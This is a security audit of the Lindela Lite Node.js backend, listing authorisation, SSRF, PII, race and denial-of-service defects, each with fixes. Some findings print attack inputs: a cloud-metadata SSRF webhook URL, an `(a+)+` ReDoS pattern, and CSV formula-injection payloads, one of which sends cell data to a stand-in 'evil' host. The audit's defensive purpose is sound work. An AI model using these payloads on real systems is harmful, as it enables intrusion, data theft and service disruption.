# Lindela Lite — Backend Security & Architecture Audit

Audit of `src/server.js`, `src/auth.js`, `src/pii.js`, `src/store.js`, `src/postgres-store.js`,
`src/utils.js`, `src/outbox.js`, `src/webhooks.js`, `src/routing.js`, `src/cap.js`, `src/stac.js`,
the connectors, and `docs/architecture/request-lifecycle.md`.

Every finding below was verified by reading the cited lines and, where marked **[verified]**, by
running the server and exercising it.

Scope note: no SQL injection was found. Every `client.query` in `src/postgres-store.js` uses
parameter placeholders (`$1`, `UNNEST(...)`); no string interpolation reaches SQL anywhere in the
codebase. No prototype pollution was found — `JSON.parse` of a body with `"__proto__"` spreads
without polluting (`Object.prototype.polluted === undefined` **[verified]**), because spread
copies own enumerable keys and does not invoke setters. The regexes in `utils.js` are safe;
`parseCsv` is a character-by-character state machine, immune to backtracking by construction.
These are in `Rejected`.

---

## Defects

### D1. A `read:hazards` token can perform every mutation the scope table forgot to name

**Severity: Critical**

`src/auth.js:57-77` — `scopeForRoute` enumerates only five path prefixes and falls through to
`read:hazards` for everything else:

```js
if (pathname.startsWith('/api/v1/ingest/') || pathname.startsWith('/api/v1/report-schedules/')) {
  return 'admin:schedules'
}
// ...
return 'read:hazards'   // line 76
```

`read:hazards` is the *read* scope. Every mutation route not on that list is therefore authorised
by a read-only credential.

**Failure scenario [verified].** Running with
`LINDELA_LITE_TOKENS='[{"token":"readonlytoken","scopes":["read:hazards"]}]'`:

| Request | Result |
|---|---|
| `POST /api/v1/community-feedback` | **201 Created** |
| `POST /api/v1/webhooks` | **201 Created** |
| `POST /api/v1/chw/reply` | **201 Created** |
| `POST /api/v1/outbox/dispatch` | **201 Created** |
| `POST /api/v1/equity/scan` | **201 Created** |
| `POST /api/v1/maintenance/apply-retention` | **200 OK** |
| `POST /api/v1/kpi/refresh-snapshots` | **200 OK** |
| `POST /api/v1/workflows` (400), `/parametric-rules` (400), `/trigger-protocols` (400) | passed the auth gate; rejected by body validation |
| `POST /api/v1/alert-rules` (control) | 403 |
| `POST /api/v1/reports` (control) | 403 |

The two controls prove the gate works for the routes it names. The 400s prove the read-only token
reached those handlers at all — they failed on a missing `type`, not on authorisation.

`POST /api/v1/maintenance/apply-retention` is the sharpest: a read-only credential reaches a route
whose entire purpose is destructive. (It is currently a no-op — see D5 — but it is one store fix
away from deleting field reports, and the authorisation hole is real today.)

**Fix.** Replace the prefix list with an explicit route→scope table keyed on `(method, pattern)`
that defaults to *deny* for any non-GET method, and add a CI test asserting every mutating route
resolves to a mutating scope.

---

### D2. Authentication fails open: unset env vars disable the gate entirely

**Severity: Critical**

`src/server.js:229-250` — the whole auth block is conditional on env vars being set:

```js
let auth = null
if (process.env.LINDELA_LITE_TOKENS || process.env.LINDELA_LITE_API_KEY) {
  // ... gate lives in here
}
```

`src/auth.js:19` — `authenticate` returns `null` when the token list is empty, and
`src/auth.js:3-14` — `parseTokens` swallows a malformed `LINDELA_LITE_TOKENS` and returns `[]`:

```js
  } catch {
    return []
  }
```

**Failure scenario.** Deploy without `LINDELA_LITE_TOKENS` and every `/api/v1` route is open,
including `POST /api/v1/ingest/run` (fan-out to all upstream APIs), `POST /api/v1/demo/seed`
(destroys and rebuilds the store), and every operational mutation. Worse: set
`LINDELA_LITE_TOKENS` to malformed JSON and you get the same open state with no warning — the
`catch` returns `[]`, `tokens.length` is 0, and the operator believes auth is on.

The docs describe the local-mode behaviour (`docs/api.md:3`, `docs/architecture.md:168`) as
intended for local/demo use, which is defensible. It is the *malformed-config* path that is a
genuine bug: a typo silently downgrades a production deployment to fully open rather than
refusing to start.

**Fix.** Log a loud warning when a token env var is present but unparseable and fail startup.
Add `LINDELA_LITE_REQUIRE_AUTH=true` (default when `NODE_ENV=production`) that makes the empty
token list a hard error.

---

### D3. Lost-update race in `JsonStore.merge` destroys concurrent writes

**Severity: Critical**

`src/store.js:75-83`:

```js
async merge(partial) {
  const current = await this.read()
  const next = { ...current }
  for (const collection of COLLECTIONS) {
    const incoming = partial[collection] || []
    if (!incoming.length) continue
    next[collection] = mergeById(current[collection] || [], incoming)
  }
  return this.write(next)          // -> fs.writeFile, no lock, no temp+rename
}
```

Read-modify-write with an `await` between the read and the write and no mutex, no lockfile, no
atomic rename.

**Failure scenario [verified].** 20 concurrent `POST /api/v1/chw/reply` requests, each with a
distinct body, against the JSON store:

```
sent:     20
survivors: 6   -> ['e20', 'e15', 'e13', 'e9', 'e8', 'e7']
```

14 of 20 records — including their `action_logs` — were silently overwritten and lost. This is not
a theoretical race; it fires on ordinary concurrent field traffic. Two CHWs reporting at once, or
a UI double-submit, loses data with a `201` returned to both callers.

`src/postgres-store.js:97-120` is *not* subject to this for `merge` (it upserts in a
transaction), but three routes in `server.js` call `store.write()` instead —
`src/server.js:2073`, `:2099`, `:2162` (all parametric routes) — and
`src/postgres-store.js:75` does `DELETE FROM lite_records` before reinserting everything. Two
concurrent parametric writes, or a parametric write concurrent with anything else, truncates the
table.

**Fix.** Serialise `merge`/`write` behind a single in-process promise chain (one process, so an
in-memory mutex is sufficient), and write via temp-file-plus-rename so a crash mid-write cannot
truncate the store. Convert the three `store.write()` call sites to `merge`.

---

### D4. Webhook subscription URL is an SSRF primitive with no scheme or host validation

**Severity: High**

`src/webhooks.js:6-9`:

```js
const url = String(input.url || '').trim()
if (!url || !url.startsWith('http')) {
  throw Object.assign(new Error('url must be an HTTPS or HTTP URL'), { statusCode: 400 })
}
```

`startsWith('http')` accepts any scheme beginning with those four letters — `httpfile:`, `httpx:` —
and accepts any host including loopback, link-local and RFC1918. The URL is later fetched
server-side at `src/outbox.js:60-65` from the single process.

**Failure scenario [verified].** `POST /api/v1/webhooks` with
`{"url":"http://169.254.169.254/latest/meta-data/","events":["incident.*"]}` returns 201 and the
subscription is stored and armed. Any subsequent event dispatch makes the server POST to the cloud
metadata service from inside the deployment. The same request, via D1, is available to a
read-only token.

**Fix.** Parse with `new URL()`, require `protocol === 'https:'` (or allow `http:` only for an
explicit opt-in list), and resolve the hostname before connecting to reject loopback, link-local,
and private ranges.

---

### D5. Retention policy is a no-op — expired PII is never deleted

**Severity: High**

`src/server.js:373-393` computes the expired set and then:

```js
await store.merge({
  field_reports: fieldReportRetention.kept,
  rapidpro_inbound_messages: inboundRetention.kept,
})
```

`merge` only ever upserts; it has no delete path (`src/store.js:75-83`,
`src/postgres-store.js:97-120`). Records omitted from `kept` are simply left in place.

**Failure scenario [verified].** Seed the store with a 400-day-old `rapidpro_inbound_messages`
record and call `POST /api/v1/maintenance/apply-retention`:

```
{"success":true,"field_reports":{"kept":0,"expired":1},
 "rapidpro_inbound_messages":{"kept":0,"expired":1}}
GET /api/v1/rapidpro/inbound -> [{"id":"inb_old","text":"ancient",...}]   // still there
```

The endpoint reports the record as expired and deleted. It is still stored and still served
unauthenticated. For a product that stores community health reports, an operator reading the
response has been told their retention policy ran when it did not.

**Fix.** Add `store.deleteWhere(collection, predicate)` and have `applyRetention` delete the
`expired` arrays rather than merge `kept`.

---

### D6. Field-report PII is stored and served in cleartext on the CHW path

**Severity: High**

`src/server.js:2237-2245` builds the inbound record with raw PII, and
`src/server.js:2248-2252` merges it **without** `redactPii`:

```js
const inbound = {
  id: stableId('inbound', [redacted.id, now]),
  text: body.description,
  contact_urn: body.reporter_phone || '',
  contact_name: body.reporter_name || '',
  ...
}
await store.merge({ field_reports: [redacted], rapidpro_inbound_messages: [inbound], ... })
```

`redactPii` is applied to `record` (line 2231) but not to `inbound`. The RapidPro path
(`src/server.js:1602,1614`) does redact both.

**Failure scenario [verified].** `POST /api/v1/chw/report` with
`{"description":"malaria cluster","reporter_name":"Mama Njeri","reporter_phone":"tel:+254712345678"}`:

```
GET /api/v1/rapidpro/inbound  (unauthenticated, 200)
  -> {"contact_urn":"tel:+254712345678","contact_name":"Mama Njeri", ...}

GET /api/v1/export.csv        (unauthenticated, 200)
  -> matched: 254712345678, Njeri
```

A named individual with a phone number, submitted over the CHW form, is readable by anyone on the
network and lands in the CSV export. The privacy policy this project ships (`src/pii.js`) is
bypassed on exactly the path that handles the most sensitive data.

**Fix.** Wrap `inbound` in `redactPii(inbound, policy)` before merging, matching the RapidPro
handler.

---

### D7. `redactPii` is not applied to most paths that store personal data

**Severity: High**

`redactPii` has exactly three call sites (`src/server.js:1602`, `:1609`, `:2231`) — both RapidPro
and one CHW branch. `src/pii.js:46` `applyRetention` is likewise invoked from one route.

`POST /api/v1/community-feedback` (`src/server.js:820-831`) stores `normalizeCommunityFeedback(body)`
with no redaction and no retention coupling. The `operational` handler (`src/server.js:1828-1846`)
stores any collection through `buildCreate` with no policy application. Retention only ever covers
`field_reports` and `rapidpro_inbound_messages` (`src/server.js:375-376`) — `community_feedback`
is not in either list, so it is neither redacted nor expired.

**Failure scenario.** Community feedback containing a complainant's name and number is stored
forever, retrievable unauthenticated via `GET /api/v1/community-feedback`, and excluded from every
retention policy the operator configures.

**Fix.** Apply redaction and retention centrally in the store write path keyed on a per-collection
policy, rather than at each handler — the current call-site approach is what let D6 happen.

---

### D8. Unauthenticated callers can trigger unbounded CPU-bound PDF generation

**Severity: High**

`src/server.js:755-774` serves `GET /api/v1/kpi/quarterly.pdf`. It is a GET, so
`src/server.js:237` (`if (!auth && req.method !== 'GET')`) never rejects it, and
`src/pdf.js:85-167` builds the entire PDF synchronously on the event loop. `year` is passed
straight from the query string (`src/server.js:756`) and never validated — `src/kpi.js:95-102`
validates `quarter` against `['Q1'..'Q4']` but not `y`, and `y` flows into `_cacheKey`
(`src/kpi.js:102`) which memoises into an unbounded `Map`.

**Failure scenario.** Any unauthenticated client loops `GET /api/v1/kpi/quarterly.pdf?year=1`,
`?year=2`, … Each call blocks the single Node event loop for the duration of the render, denying
service to every other request including ingestion; each distinct year adds a permanent cache
entry, so the process memory grows without bound.

**Fix.** Require auth on the PDF route, validate `year` as a 4-digit integer, bound the KPI cache,
and move rendering off the event loop.

---

### D9. Webhook event globs are compiled to regex without escaping — ReDoS

**Severity: High**

`src/webhooks.js:50-58` (duplicated verbatim at `src/outbox.js:119-127`):

```js
function globMatch(pattern, text) {
  const regex = new RegExp(
    `^${pattern
      .replace(/\./g, '\\.')
      .replace(/\*/g, '.*')
      .replace(/\?/g, '.')}$`
  )
  return regex.test(text)
}
```

Only `.`, `*` and `?` are escaped. `(`, `)`, `+`, `[`, `{`, `|`, `\` pass through as raw regex
metacharacters, so a subscriber controls a regular expression, not a glob.

**Failure scenario [verified].** Subscribe with `events: ["(a+)+"]`. Measured against a
non-matching string:

```
n=16  5 ms      n=20   239 ms     n=22   562 ms
n=24  3,819 ms  n=26  14,168 ms
```

Exponential in the input length — at n=40 the single regex call hangs the event loop for longer
than any timeout. `dispatchPending` runs these on every outbox cycle
(`src/outbox.js:29-31`), so one subscription freezes the process for the whole deployment.

**Fix.** Escape all regex metacharacters before substituting `*`/`?`, or drop the regex entirely
for a plain prefix/split-segment glob match. Apply the fix in both copies.

---

### D10. No rate limiting anywhere; the auth gate does not bound request cost

**Severity: High**

There is no rate limiter in `src/server.js` — no occurrence of `rateLimit`, `x-forwarded-for`, or
per-subject counter. Several connectors declare `rateLimit: { perMinute: N }`
(`src/connectors/gdacs.js:75`, `ipc-hdx.js:417`, `noaa-enso.js:267`, and five others) but no code
reads that field; it is decorative.

**Failure scenario.** Unauthenticated `GET /api/v1/kpi/quarterly.pdf` (D8), `POST /api/v1/ingest/run`
(fans out to every upstream API with no concurrency cap), and `POST /api/v1/demo/seed` (rebuilds the
entire store) are all individually sufficient to exhaust the host. `src/connectors/ipc-hdx.js:265`
runs `Promise.all` over an upstream-derived country list with no concurrency bound, so one
caller-triggered ingest opens an unbounded number of sockets.

**Fix.** Add a token-bucket limiter keyed on subject (falling back to peer address) at the router,
and a separate much stricter bucket for the expensive routes. Honour the connectors' declared
`rateLimit` values.

---

### D11. `metrics` histogram grows without bound, and `/metrics` is public

**Severity: Medium**

`src/observability.js:66-78`:

```js
const entry = metricsStore.histograms.get(key)
entry.values.push(valueMs)
```

The ring buffer for request logs is correctly capped (`src/observability.js:12-17`, `REQUEST_RING_SIZE
= 100`), which makes the histogram the outlier — `values` is never trimmed. Every request on every
route pushes one entry (`src/server.js:123-124`), and `render()` (`src/observability.js:101-108`)
re-scans every retained value on every scrape. `/metrics` is served before the auth gate
(`src/server.js:105-109`) and returns label values and route names.

**Failure scenario.** Any unauthenticated client loops any URL. `entry.values` grows linearly with
total requests since process start; heap rises without bound until the process is OOM-killed.

**Fix.** Trim histogram `values` to a bounded window (or accumulate into fixed buckets only and
drop the raw array), and require a token for `/metrics` when auth is configured.

---

### D12. API token prefix is written into every action log and into stored records

**Severity: Medium**

`src/auth.js:37`:

```js
subject: `token_${token.slice(0, 8)}`,
```

That subject is threaded into every `actionLog` (`src/server.js:928, 937, 951, …`) and, via
`src/server.js:2226`, stored on CHW field reports themselves.

**Failure scenario [verified].** A report created with key `SUPERSECRETKEY123456789` came back as
`"reported_by":"token_SUPERSEC"`. Eight characters of a bearer credential are persisted in
`action_logs` and in the `field_reports` record, both of which are readable unauthenticated via
`GET /api/v1/action-logs`. For a key whose first 8 characters are a weak or common prefix, that is
a meaningful reduction in the search space; for any key it is credential material in a place the
operator believes is an audit trail.

**Fix.** Use an opaque stable hash (`sha256(token)` truncated) as the subject, or a configured
`subject` per token entry in `LINDELA_LITE_TOKENS`.

---

### D13. Token comparison is not constant-time

**Severity: Medium**

`src/auth.js:31`:

```js
const found = tokens.find(t => t.token === token)
```

`===` on strings short-circuits on first differing byte. `src/server.js:897` (`isAuthorizedMutation`)
has the same flaw via `req.headers['x-api-key'] === process.env.LINDELA_LITE_API_KEY`. The lifecycle
doc already flags this (`docs/architecture/request-lifecycle.md:155`), which means it is a known
unfixed defect rather than a new finding.

**Failure scenario.** A remote timing attacker with millisecond-resolution network timing recovers
the bearer token byte by byte via `Content-Length`/`Date` variance. Difficult over a real network,
trivial over a co-located one or via a streaming oracle.

**Fix.** Compare with `crypto.timingSafeEqual` over fixed-length buffers, iterating all tokens so
length differences do not leak either.

---

### D14. `scopeToPartnerOrg` is dead code — multi-tenant isolation does not exist

**Severity: Medium**

`src/auth.js:85-88`:

```js
export function scopeToPartnerOrg(records, auth, field = 'partner_org') {
  if (!auth?.partner_org) return records
  return records.filter((record) => record[field] === auth.partner_org || !record[field])
}
```

`authenticate` returns `{ token, scopes, subject }` — it never sets `partner_org`, so the guard
always returns `records` unchanged. The lifecycle doc notes this at
`docs/architecture/request-lifecycle.md:166-168`.

**Failure scenario.** An operator configures two partner tokens believing partner A cannot see
partner B's data. It can. The filter is a no-op that reads as if isolation were implemented — worse
than its absence, because the code invites reliance on it.

**Fix.** Either read `partner_org` from the token entry in `parseTokens` and apply this filter in
`filterRecords`, or delete the function so the absence of isolation is visible.

---

### D15. `readRequestJson` bounds bytes but not array or object depth

**Severity: Medium**

`src/utils.js:272-304` enforces a 5 MB ceiling (`DEFAULT_MAX_BODY_BYTES`) on the raw body. Nothing
bounds what is inside it.

**Failure scenario.** `POST /api/v1/analytics/bias-correct` (`src/server.js:660-667`) with
`observations` and `stations` arrays sized to fill the 5 MB budget hands both straight to
`biasCorrectClimate`. `POST /api/v1/scenarios` (`src/server.js:328`) passes
`body.perturbation || body` — the entire body — into `runScenario`. A 5 MB deeply-nested object is
also within limits; JSON.parse itself is fine but downstream recursion is not uniformly bounded.

**Fix.** Add per-collection array-length and string-length caps in the relevant `normalize*`
functions, and reject bodies exceeding a nesting depth.

---

### D16. Path traversal defence is lexical only — no `realpath`

**Severity: Low**

`src/server.js:2500-2507`:

```js
function safeJoin(rootDir, target) {
  const filePath = path.resolve(rootDir, target || '')
  const relative = path.relative(rootDir, filePath)
  if (relative.startsWith('..') || path.isAbsolute(relative)) { throw ... }
  return filePath
}
```

`path.resolve` is purely lexical; there is no `fs.realpath` anywhere in `server.js`. `hasTraversalSegment`
(`src/server.js:2619-2626`) blocks `..` segments after one `decodeURIComponent`, and correctly
404s on a decode failure — both are good. But neither follows symlinks.

**Failure scenario.** A symlink inside `public/` or `docs/` pointing at `/etc` or the repo root is
followed by `fs.readFile` and served. No such symlink exists today (`find public -type l` is
empty), so this is latent, not live. It becomes live the moment an operator adds a symlink — which
is a normal thing to do for a docs directory.

**Fix.** Resolve with `fs.realpath` after the join and re-check containment.

---

### D17. CSV export is vulnerable to formula injection

**Severity: Low**

`src/utils.js:235-240`:

```js
function csvEscape(value) {
  if (value === null || value === undefined) return ''
  const text = String(value)
  if (/[",\n]/.test(text)) return `"${text.replaceAll('"', '""')}"`
  return text
}
```

Only the delimiter and quote are handled. A leading `=`, `+`, `-` or `@` is emitted verbatim.

**Failure scenario [verified].** `csvEscape("=cmd|'/c calc'!A1")` returns the string unquoted.
`GET /api/v1/export.csv` is unauthenticated and aggregates `field_reports`,
`rapidpro_inbound_messages` and `community_feedback` — all attacker-influenced free text. A CHW
report summary of `=HYPERLINK("http://evil/"&A1)` becomes a live formula when an operator opens the
export in Excel or LibreOffice.

**Fix.** Prefix cells beginning with `= + - @` with a single quote, per the OWASP CSV guidance.

---

### D18. Content-Type is trusted implicitly; responses do not vary

**Severity: Low**

`src/utils.js:299-303` parses whatever arrives as JSON with no `content-type` check, and
`src/utils.js:260-268` `jsonResponse` sets `cache-control: no-store` unconditionally — correct
for `/api`, but there is no `Vary` handling for `Accept-Encoding` on JSON responses, which are
never compressed at all.

**Failure scenario.** Low impact on its own. Worth noting alongside D19: the gzip path exists only
in `sendFile` (`src/server.js:2575`), so the API payloads — which are the large ones — are never
compressed. On a field connection this is the difference between a usable and an unusable
dashboard for JSON-heavy views.

**Fix.** Validate `content-type` on bodies that must be JSON; extend the compression path to
`jsonResponse` for payloads above a threshold.

---

### D19. `readRequestJson` result is spread into records without field allowlisting

**Severity: Low**

`src/server.js:1859`:

```js
const record = buildUpdate(route.collection, existing, { ...body, id: route.id }, data)
```

`buildUpdate` (`src/operations.js:59-68`) then re-normalises through per-collection normalisers, and
`normalizeFieldReport` builds an explicit object — so for the operational collections the
allowlisting holds and I could not construct a pollution or mass-assignment path. The risk is
latent for the `PATCH` routes that spread into normalisers which pass values through:
`src/server.js:1703` (`normalizeAlertRule({ ...existing, ...body, id: route.id })`) and
`src/server.js:1770` (`normalizeTriggerProtocol({ ...existing, ...body })`).

**Failure scenario.** Any field those two normalisers do not explicitly pick up is stored verbatim,
so a future edit that adds a permissive branch becomes a mass-assignment bug with no test failing.

**Fix.** Assert the normalised record's key set in the normalisers, and add a test that a body
containing unexpected keys produces a 400.

---

### D20. Missing value coerced to `0` in three connectors, propagating into severity

**Severity: Medium**

The repository has already identified this bug class and written the correct pattern twice —
`src/utils.js:62-67` (`toNumber` with its Null-Island comment) and
`src/connectors/gdacs-archive.js:125` (`severityNumeric > 0 ? severityNumeric : null`). Three
connectors do not use it:

- `src/connectors/nasa-firms.js:45` — `const frp = toNumber(row.frp, 0)`, then
  `src/connectors/nasa-firms.js:51` buckets it: `frp > 100 ? 'high' : frp > 25 ? 'medium' : 'low'`.
- `src/connectors/usgs-earthquake.js:36` — `const magnitude = toNumber(props.mag, 0)`, so
  `src/connectors/usgs-earthquake.js:49` renders `M0.0 earthquake`.
- `src/connectors/uploads.js:196` — `fatalities: toNumber(row.fatalities, 0)`, driving severity at
  `src/connectors/uploads.js:188`.

**Failure scenario.** A fire detection with no FRP reading becomes 0 MW and is categorised `low`. An
earthquake with no magnitude becomes M0.0, `low`. A conflict row with a blank fatality count is
stored as `fatalities: 0` — indistinguishable from a verified zero in every casualty rate the
toolkit computes and every dashboard renders. For a product making claims about conflict harm,
conflating "not reported" with "nobody died" is the most consequential kind of wrong.

**Fix.** Pass `null` as the `toNumber` fallback in all three and propagate null through severity
bucketing, matching `gdacs-archive.js`.

---

### D21. `Math.min(...spread)` over an unbounded collection

**Severity: Medium**

`src/rapidpro.js:220`:

```js
const earliestDispatch = Math.min(...dispatchTimes)
```

`dispatchTimes` is built by an unfiltered `.filter()` over the whole `rapidpro_dispatches`
collection (`src/rapidpro.js:217-219`) and spread as function arguments.

**Failure scenario.** Past roughly 100k dispatches for one alert event, this throws
`RangeError: Maximum call stack size exceeded` — turning a metrics computation into a 500 on a
route that is otherwise a pure read.

**Fix.** Reduce over the array: `dispatchTimes.reduce((a, b) => Math.min(a, b), Infinity)`.

---

### D22. Outbound POST in `distributeReport` has no timeout and no SSRF guard

**Severity: Medium**

`src/server.js:1380-1384`:

```js
const response = await fetch(required(channel.url, 'url'), {
  method: 'POST',
  headers: { 'content-type': 'application/json', ...(channel.headers || {}) },
  body: JSON.stringify({ report, markdown: renderReportMarkdown(report) }),
})
```

No `signal`, no `AbortSignal.timeout` — unlike every connector, which goes through
`src/connectors/http.js:5` (`AbortSignal.timeout(timeoutMs)`). `channel.url` is caller-supplied and
unvalidated, and `channel.headers` lets a caller override arbitrary request headers.

**Failure scenario.** `POST /api/v1/reports/{id}/distribute` with
`{"channels":[{"channel":"webhook","url":"http://10.0.0.5:8080/..."}]}` makes the server issue an
unauthenticated-by-timeout POST to an internal address, carrying the full report body. A hung
endpoint holds the request handler open indefinitely.

**Fix.** Validate the URL as in D4, apply `AbortSignal.timeout`, and restrict mergeable headers to
an allowlist.

---

### D23. `globMatch` duplicate in `outbox.js` — the D9 fix must be applied twice

**Severity: Low (duplication note)**

`src/webhooks.js:50-58` and `src/outbox.js:119-127` are byte-identical copies of `globMatch` and
`matchEvent`. `outbox.js:3` imports `stableId, nowIso` from `./utils.js` but re-implements the
matching that `webhooks.js` already exports.

**Failure scenario.** A fix applied to one copy leaves the other vulnerable, with no test
distinguishing them.

**Fix.** Import `matchEvent` from `webhooks.js` in `outbox.js` and delete the copy.

---

## Enhancements

### E1. Explicit route→scope table with deny-by-default

**Value.** A caller with a read token can no longer mutate anything, and the authorisation policy
becomes a readable table an operator can audit rather than a prefix list they must reverse-engineer.
Turns D1 from a recurring class into a one-line change plus a test.

**Evidence.** `src/auth.js:57-77` — five `pathname.startsWith` branches and a `return
'read:hazards'` fallback at `:76`. `src/server.js:243` is the single call site, so there is exactly
one place to change.

**Sketch.** Export a `ROUTE_SCOPES` array of `[RegExp, {GET: scope, POST: scope, ...}]`; resolve
with the first match; if a non-GET method has no entry, `requireScope` with a sentinel that
`authenticate` can never satisfy. Add a CI test that walks every registered route and asserts
non-GET routes resolve to a scope outside the `read:` namespace.

### E2. Conditional requests on the API, not just static files

**Value.** Clients on a metered field connection stop re-fetching multi-hundred-KB risk and
assessment payloads every poll; a dashboard refresh becomes a 304 with an empty body.
`sendFile` already proves the pattern works — it is just not applied to the API.

**Evidence.** `src/server.js:2527-2530` implements `etagFor`, and `src/server.js:2569-2573`
handles `if-none-match` — but both live inside `sendFile`, which only static assets reach. Every
API response goes through `src/utils.js:260-268` `jsonResponse`, which sets only
`cache-control: no-store` and no `etag`.

**Sketch.** Add an optional `etag` argument to `jsonResponse`; compute
`W/"${sha1(JSON.stringify(body))}"` in `handleApi` after the store read, short-circuit on
`if-none-match`, and honour `if-modified-since` against `data.updated_at` for the collections
endpoints where the whole store changed.

### E3. Cursor pagination and a total-count envelope

**Value.** Callers can page deterministically through a large collection instead of being silently
truncated at 500 records with no indication that more exist — which today makes a caller believe it
has seen everything.

**Evidence.** `src/utils.js:149` caps every list:
`const limit = Math.min(Math.max(Number(query.get('limit') || 500), 1), 5000)` and
`src/utils.js:174` applies `.slice(0, limit)` with no offset and no total. Verified edge case:
`?limit=-5` is clamped up to 1 and silently returns a single record, so a client with a paging bug
sees a plausible-looking one-item response rather than an error.

**Sketch.** Add `cursor` (opaque, base64 of the last `recordTimestamp`+`id` from
`src/store.js:126-135`) and `limit`; return `{ data, next_cursor, total }`. Reject
`limit` outside 1..1000 rather than silently clamping.

### E4. Idempotency keys on mutations

**Value.** A field team on a flaky connection retries a POST; today a retry creates a second
incident or sends a second SMS. With an idempotency key, the retry returns the original response
and nothing is duplicated.

**Evidence.** `src/server.js:928-940` and every sibling POST route call `store.merge` directly
with no idempotency handling. `stableId` (`src/utils.js:4-7`) already produces deterministic ids
for some records — `src/server.js:2261` `stableId('inbound', [body.alert_event_id, body.message, now])`
includes `now`, so it is explicitly non-idempotent by construction.

**Sketch.** Accept `Idempotency-Key`; store `{key, request_hash, response_body, status}` in a new
collection; on replay with a matching hash, return the cached response with
`Idempotency-Replayed: true`; on a hash mismatch, 409.

### E5. Health and readiness endpoints that actually check dependencies

**Value.** An orchestrator can distinguish "process is up but Postgres is unreachable" from
"process is down", and drain traffic before shutdown. Today a liveness probe passes against a
process that cannot serve a single query.

**Evidence.** `src/server.js:255-272` returns `status: 'ok'` unconditionally after a store read
that already happened at `:252`, and never reports a dependency error — a failed read produces a
500 from the global handler, indistinguishable from any other failure. There is no readiness probe
and no `process.on('SIGTERM')` handler anywhere (`grep` for `process.on` in `src/index.js` returns
nothing).

**Sketch.** Add `GET /api/v1/ready` that runs `SELECT 1` against the pool with a short timeout,
reports per-dependency status and last successful ingestion timestamp, and returns 503 when a
dependency is down. Add a SIGTERM handler that stops accepting connections, drains, and calls
`store.close()` (`src/postgres-store.js:216` already exists).

### E6. Bounded, structured request logs

**Value.** An operator can answer "what happened at 03:14" without unbounded memory growth, and
logs stop being a denial-of-service vector. Currently the metrics ring buffer is bounded but the
histogram is not, which is the inconsistency.

**Evidence.** `src/observability.js:76` `entry.values.push(valueMs)` with no trim, against
`src/observability.js:12-17` where the request ring correctly caps at 100. Log lines are already
structured JSON (`src/server.js:126` `logger.info('http_request', {...})`), so the shape is right —
only the bounds are missing.

**Sketch.** Keep histogram values in fixed buckets with exponential decay rather than a raw array;
emit a `request_id` on every response and thread it through handler logs; add a
`logger.child({ request_id })` so error lines are correlatable.

### E7. Webhook signing with replay protection and delivery inspection

**Value.** A subscriber can verify authenticity *and* detect a replayed delivery, and an operator
can see why a delivery failed instead of guessing. Today a signature exists but no timestamp, no
replay window, and failures are swallowed entirely.

**Evidence.** `src/outbox.js:53-55` signs the body:
`headers['x-signature'] = signPayload(webhook.secret, body)` — a bare HMAC over the body with no
timestamp, so a captured payload can be replayed forever. `src/outbox.js:72-74` swallows the error
entirely (`catch (error) { // Swallow individual webhook errors }`), so `last_error` is never
populated and the `attempts`/`failed` state carries no diagnostic. Backoff at `:90-97` is
commented "will retry in next dispatch cycle" with no delay tracking, so a failing endpoint is
retried on every cycle rather than backing off exponentially.

**Sketch.** Sign `timestamp.body` with HMAC-SHA256, send `x-lindela-timestamp` and
`x-lindela-signature: v1=<hex>`, document a 5-minute tolerance. Persist
`last_error: error.message` and a real `next_attempt_at` computed from exponential backoff, and
expose `GET /api/v1/outbox/{id}` with the per-webhook attempt history.

### E8. Async job semantics for expensive work

**Value.** Ingestion, model training and PDF rendering stop blocking a request for minutes, and a
caller gets a job handle instead of a timeout. Today these are synchronous request handlers that
occupy the single event loop for their whole duration.

**Evidence.** `src/server.js:353-371` (`POST /api/v1/ingest/run`) awaits
`runIngestion(store, body)` and then `refreshAnalytics(store)` inline; `src/server.js:525-538`
(`POST /api/v1/flood-probability/train`) awaits `trainDistrictModels` inline; `src/server.js:755`
renders the PDF inline. All three are unbounded work with no progress reporting, and D1 shows the
first is reachable by a read-only token.

**Sketch.** Return `202 Accepted` with `{ job_id, status_url }`; persist job state in an existing
collection; run work through a small in-process queue with a concurrency cap of 1 (matching the
store's serialisation requirement from D3); `GET /api/v1/jobs/{id}` returns status, progress and
the final result.

### E9. Field-level filtering, sorting and sparse fieldsets

**Value.** A dashboard panel asking for three fields over 5,000 records transfers a fraction of the
payload, and `?sort=-observed_at` removes a client-side sort that is currently impossible because
the API offers no ordering control.

**Evidence.** `src/utils.js:125-175` `filterRecords` supports ~18 filter dimensions and a `limit`
but no `sort`, no `fields`, and no `offset`. Output shape is whatever the normaliser produced.
Ordering is therefore whatever `mergeById` left (`src/store.js:123`) — an incidental sort by
timestamp, not an API contract.

**Sketch.** Add `?fields=a,b,c` to project the response, `?sort=field|-field` with an allowlist of
sortable keys per collection, and `?order=asc|desc`. Reuse the field list as the OpenAPI schema so
the two cannot drift.

### E10. OpenAPI 3.1 generated from the same table that drives auth

**Value.** The scope table, the route table and the published contract stop being three
independent descriptions that drift — E1 gives the first two a single source, and this makes the
third derive from it.

**Evidence.** `src/server.js:84-128` is a flat `if` chain with no route registry; routing is
distributed across eight `match*Route` functions (`src/server.js:2034-2373`) plus inline `if`
blocks in `handleApi`. There is no OpenAPI document in the codebase, and `docs/api.md` is prose
maintained by hand. `APP_VERSION` (`src/server.js:71-80`) already reads `package.json` at startup —
the same discipline applied to the contract would prevent the drift the comment there describes.

**Sketch.** Build a route registry as data (method, pattern, scope, handler, request schema,
response schema). Generate `openapi.json` from it at startup, serve it at `/openapi.json`, and add
a test asserting every registry entry appears in the document and vice versa.

---

## Rejected

- **SQL injection** — none exists. Every `client.query` in `src/postgres-store.js` uses `$1`-style
  placeholders, including the bulk `UNNEST($1::text[], ...)` insert at `:146-161`; no string
  interpolation reaches SQL anywhere.
- **Prototype pollution via `JSON.parse`** — not exploitable. Verified: spreading a body containing
  `"__proto__"` leaves `Object.prototype.polluted === undefined`, because spread copies own
  enumerable keys without invoking setters. Every merge site in the audited paths goes through a
  normaliser that rebuilds the record explicitly.
- **ReDoS in `utils.js` regexes** — `parseCsv` (`src/utils.js:177-207`) is a character-by-character
  state machine and immune to backtracking by construction, which matters because it parses
  attacker-supplied 5 MB strings via `src/connectors/uploads.js:24`. The dynamic `new RegExp` calls
  in `gdacs.js:201`, `glofas.js:92` and `spec.js:10` interpolate only hardcoded tag names. The
  real regex-injection defect is in `webhooks.js`, tracked as D9.
- **CSRF** — not applicable. The API is token-authenticated via `Authorization`/`x-api-key` headers
  and sets no cookies; there is no ambient credential for a cross-site request to ride. Adding
  cookie auth would create the problem rather than solve one.
